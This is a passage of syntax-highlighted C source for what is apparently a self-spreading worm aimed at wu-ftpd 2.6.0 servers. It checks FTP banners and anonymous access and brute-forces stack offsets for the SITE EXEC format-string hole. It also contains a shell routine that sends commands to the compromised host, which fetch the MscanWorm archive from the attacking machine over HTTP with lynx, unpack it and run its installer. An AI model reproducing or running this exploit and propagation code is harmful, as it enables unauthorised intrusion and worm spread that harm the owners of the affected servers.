    </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">TCP_NB_connect</span><span class="sc10">(</span><span class="sc11">iptr</span><span class="sc10">-&gt;</span><span class="sc11">h_network</span><span class="sc10">,</span><span class="sc11">iptr</span><span class="sc10">-&gt;</span><span class="sc11">h_port</span><span class="sc10">,</span><span class="sc11">CONNECT_TIME</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">readable_timeo</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FTP_READTIMEOUT</span><span class="sc10">)&lt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">tmpResult</span><span class="sc10">=</span><span class="sc11">readline</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">serv_string</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tmpResult</span><span class="sc10">&lt;=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">serv_string</span><span class="sc10">,</span><span class="sc6">"220"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">tmpStr</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">serv_string</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"(Version wu-2.6.0"</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">//check Wu FTP 2.60
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Check_Anonymous_FTP</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    
                    
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">FTP_shell</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sock</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">setupworm_command</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">         </span><span class="sc2">//run shell ,send the following command to remote host
</span><span class="sc0">       </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc6">"export TERM=vt100\n"</span><span class="sc10">,</span><span class="sc0"> 
        </span><span class="sc6">"mkdir /usr/bin/Mworm\n"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"Download Mworm \n"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"cd /usr/bin/Mworm\n"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"tar -xzvf MscanWorm.tgz\n"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"cd MscanWorm\n"</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc6">"sh install.sh\n"</span><span class="sc0">
        </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">command_count</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">//the command count
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">tmpbuf</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
        
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">;){</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">readable_timeo</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FTP_READTIMEOUT</span><span class="sc10">)&lt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">               
        </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&lt;=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef DEBUG                
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif      
</span><span class="sc0">            
    </span><span class="sc10">}</span><span class="sc0">
        
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">command_count</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">writeable_timeo</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FTP_WRITETIMEOUT</span><span class="sc10">)&lt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef DEBUG                
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"write: %s\n"</span><span class="sc10">,</span><span class="sc11">setupworm_command</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc9">#endif                  
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">tmpbuf</span><span class="sc10">,</span><span class="sc0"> 
             </span><span class="sc6">"lynx --dump http://%s:7977//usr/bin/Mworm/MscanWorm.tgz &gt;/usr/bin/Mworm/MscanWorm.tgz\n"</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc11">Get_localIP</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">writen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmpbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">tmpbuf</span><span class="sc10">))&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> 
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">writen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">setupworm_command</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">setupworm_command</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]))&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">;){</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">readable_timeo</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FTP_READTIMEOUT</span><span class="sc10">)&lt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">               
            </span><span class="sc11">l</span><span class="sc10">=</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l</span><span class="sc10">&lt;=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">l</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef DEBUG                
</span><span class="sc0">            </span><span class="sc11">write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif      
</span><span class="sc0">            
        </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//      printf ("%s",buf);
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">
    
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">ftp_recv_until</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">begin</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">dbuff</span><span class="sc10">[</span><span class="sc4">2048</span><span class="sc10">];</span><span class="sc0">


    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">buff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dbuff</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dbuff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">net_rlinet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">begin</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">begin</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">ftp_finddist</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ftpsock</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">         </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">rdist</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc1">/* relative distance */</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">          </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0">            </span><span class="sc11">sbuf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">],</span><span class="sc0">
                </span><span class="sc11">rbuf</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0">   </span><span class="sc11">e1</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">e2</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc1">/* brute routine taken from bobek.py
     */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_max</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SITE EXEC 7 mmmmnnnn"</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%.f"</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%.f"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%d"</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"|%08x|%08x|"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">net_write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sbuf</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">net_rlinet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"#"</span><span class="sc10">);</span><span class="sc0">           
        </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strchr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'|'</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">s</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sscanf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%08lx|%08lx"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">e1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">e2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e1</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6d6d6d6d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rdist</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e1</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6e6d6d6d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e1</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6e6e6d6d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e1</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6e6e6e6d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e1</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6e6e6e6e</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e2</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6e6e6e6d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e2</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6e6e6d6d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">bufdist_min</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rdist</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e2</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x6e6d6d6d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
